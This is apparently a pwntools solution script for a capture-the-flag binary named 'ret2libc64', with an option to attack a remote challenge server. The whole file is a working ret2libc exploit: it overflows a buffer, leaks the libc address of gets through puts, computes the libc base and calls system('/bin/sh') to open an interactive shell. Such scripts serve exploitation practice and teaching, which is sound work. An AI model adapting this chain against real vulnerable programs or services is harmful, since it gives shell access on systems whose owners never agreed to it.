#!/usr/bin/env python3

from os.path import dirname
from pwn import *

elf = context.binary = ELF(f"{dirname(__file__)}/../generate/ret2libc64")


def start():
    global libc

    if args.REMOTE:
        libc = ELF(f"{dirname(__file__)}/libc6_2.35-0ubuntu3_amd64.so")
        return remote("pwn.platypew.social", 30007)

    libc = elf.libc

    if args.GDB:
        return gdb.debug(elf.path, gdbscript='continue')

    return process(elf.path)

p = start()

rop = ROP(elf)
rop.raw(b"A" * cyclic_find(0x616161616161616a, n=8))
rop.call('puts', [elf.got['gets']])
rop.call('vuln')

p.sendline(rop.chain())
p.recvuntil(b"Guess my name\n")

gets = p.recv().strip()
GETS_LIBC = u64(gets.ljust(8, b"\x00"))

log.info(f"GETS@LIBC: {hex(GETS_LIBC)}")

libc.address = GETS_LIBC - libc.sym["gets"]
log.info(f"LIBC BASE: {hex(libc.address)}")

rop = ROP([elf, libc])
rop.raw(b"A" * cyclic_find(0x616161616161616a, n=8))
rop.raw(rop.ret.address)
rop.call('system', [next(libc.search(b"/bin/sh\x00"))])
rop.call('exit', [0])

p.sendline(rop.chain())
p.clean()
p.interactive()
